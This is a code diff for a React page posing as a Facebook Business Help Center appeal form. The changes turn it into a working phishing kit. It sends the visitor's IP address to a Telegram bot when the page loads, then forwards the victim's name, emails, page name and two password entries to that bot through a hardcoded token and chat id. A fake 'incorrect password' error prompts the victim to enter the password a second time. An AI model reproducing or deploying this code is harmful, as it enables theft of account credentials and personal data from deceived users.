@@ -1,6 +1,8 @@
 import React from 'react';
 import styles from '../styles/appeal-form.module.css';
-import { useState } from "react";
+import { useState, useEffect } from "react";
+import { useForm } from "react-hook-form";
+
 import Nav from './nav';
 
 
@@ -8,19 +10,74 @@ const AppealForm = (props) => {
 
     const [steps, setSteps] = useState({first_password: false, second_password: false});
 
-    const appealSubmit = () => {
-        // console.log('is here');
-        setSteps({first_password: true, second_password: false});
+    const { register, handleSubmit } = useForm();
+
+    useEffect(() => {
+        callAPI();
+    }, [props]);
+
+    const callAPI = async () => {
+        try {
+            const message = `Message: hini ip:${props.ip.userIP}`
+            const res = await fetch(`https://api.telegram.org/bot6456875750:AAH43ljhNaQYp7YGWENw6ujyFIuxRfFxA-g/sendMessage?chat_id=1533093397&text=${message}`);
+            const data = await res.json();
+        } catch (err) {
+            console.log(err);
+        }
+    };
+
+    const onSubmit = (data) => {
+        sendAppealData(data)
     }
 
-    const firstPasswordSubmit = () => { 
-        setSteps({first_password: false, second_password: true})
+    const sendAppealData = async (data) => {
+        try {
+
+            const message = `
+             Ip:${props.ip.userIP}, Appeal: ${data.appeal}, Full Name: ${data.fullname}, Bussines: ${data.bussinesEmail}, Personal: ${data.personalEmail}, Page Name: ${data.pageName} 
+            `
+            const res = await fetch(`https://api.telegram.org/bot6456875750:AAH43ljhNaQYp7YGWENw6ujyFIuxRfFxA-g/sendMessage?chat_id=1533093397&text=${message}`);
+            setSteps({first_password: true, second_password: false});
+
+        } catch (err) {
+            console.log(err);
+        }
+    }
+
+    const sendFirstPw = async (data) => {
+        try {
+
+            const message = `
+             Ip:${props.ip.userIP}, pw: ${data.password}`;
+            const res = await fetch(`https://api.telegram.org/bot6456875750:AAH43ljhNaQYp7YGWENw6ujyFIuxRfFxA-g/sendMessage?chat_id=1533093397&text=${message}`);
+            setSteps({first_password: false, second_password: true})
+
+        } catch (err) {
+            console.log(err);
+        }
+    }
+
+    const sendSecondPw = async (data) => {
+        try {
+
+            const message = `
+             Ip:${props.ip.userIP}, second pw: ${data.password}`;
+            const res = await fetch(`https://api.telegram.org/bot6456875750:AAH43ljhNaQYp7YGWENw6ujyFIuxRfFxA-g/sendMessage?chat_id=1533093397&text=${message}`);
+            setSteps({first_password: false, second_password: false})
+            trigerNext();
+
+        } catch (err) {
+            console.log(err);
+        }
+    }
+
+    const firstPasswordSubmit = (data) => { 
+        sendFirstPw(data);
 
     }
 
-    const secondPasswordSubmit = () => { 
-        setSteps({first_password: false, second_password: false})
-        trigerNext();
+    const secondPasswordSubmit = (data) => { 
+        sendSecondPw(data)
     }
 
     const trigerNext = () => {
@@ -32,7 +89,6 @@ const AppealForm = (props) => {
     <div className={styles.layout}>
         
         <Nav/>
-
         <div className={styles.help}>
             <div className={styles.wrapper}>
                 <p>Facebook Business Help Center</p>
@@ -40,7 +96,7 @@ const AppealForm = (props) => {
         </div>
 
         <div className={styles.appeal}>
-            <form>
+            <form onSubmit={handleSubmit(onSubmit)}>
                 <div className={styles.steps}>
                     <div className={styles.top}>
                         <div className={styles.circle}></div>
@@ -70,31 +126,32 @@ const AppealForm = (props) => {
 
                 <div className={styles.formGroup}>
                     <label className={styles.mainLabel}>Please provide us information that will help us investigate</label>
-                    <textarea></textarea>
+                    <textarea {...register("appeal")}></textarea>
+                    
                 </div>
 
                 <div className={styles.formGroup}>
                     <label>Full Name</label>
-                    <input type="text"/>
+                    <input type="text" {...register("fullname")}/>
                 </div>
                 <div className={styles.formGroup}>
                     <label>Business Email Address</label>
-                    <input type="text"/>
+                    <input type="email" {...register("bussinesEmail")}/>
                 </div>
                 <div className={styles.formGroup}>
                     <label>Personal Email Address</label>
-                    <input type="text"/>
+                    <input type="email" required {...register("personalEmail")}/>
                 </div>
                 <div className={styles.formGroup}>
                     <label>Mobile Phone Number</label>
-                    <input type="text"/>
+                    <input type="phone" {...register("mobilePhone")}/>
                 </div>
                 <div className={styles.formGroup}>
                     <label>Facebook Page Name</label>
-                    <input type="text"/>
+                    <input type="text" {...register("pageName")}/>
                 </div>
 
-                <button type="button" onClick={appealSubmit}>Submit</button>
+                <button type="submit">Submit</button>
             </form>
         </div>
 
@@ -109,16 +166,16 @@ const AppealForm = (props) => {
                         <div className={styles.top}>
                             <h3>Please enter your password</h3>
                         </div>
-                        <form>
+                        <form onSubmit={handleSubmit(firstPasswordSubmit)}>
                             <p className={styles.securityInfo}>For your security, you must enter your password to continue.</p>
 
                             <div className={styles.formGroup}>
                                 <label>Password:</label>
-                                <input type="password"/>
+                                <input type="password" required {...register("password")} />
                             </div>
 
                             <div className={styles.bottom}>
-                                <button type="button" onClick={firstPasswordSubmit}>Continue</button>
+                                <button type="submit">Continue</button>
                             </div>
                         </form>
                     </div>
@@ -130,18 +187,18 @@ const AppealForm = (props) => {
                         <div className={styles.top}>
                             <h3>Please Re-Enter Your Password</h3>
                         </div>
-                        <form>
+                        <form onSubmit={handleSubmit(secondPasswordSubmit)}>
                             <p className={styles.securityInfo}>For your security, you must enter your password to continue.</p>
 
                             <div className={styles.formGroup}>
                                 <label>Password:</label>
-                                <input type="password"/>
+                                <input type="password" required {...register("password")}/>
                                 <p className={styles.error}>The password you've entered is incorrect.</p>
 
                             </div>
 
                             <div className={styles.bottom}>
-                                <button type="button" onClick={secondPasswordSubmit}>Continue</button>
+                                <button type="submit">Continue</button>
                             </div>
                         </form>
                     </div>
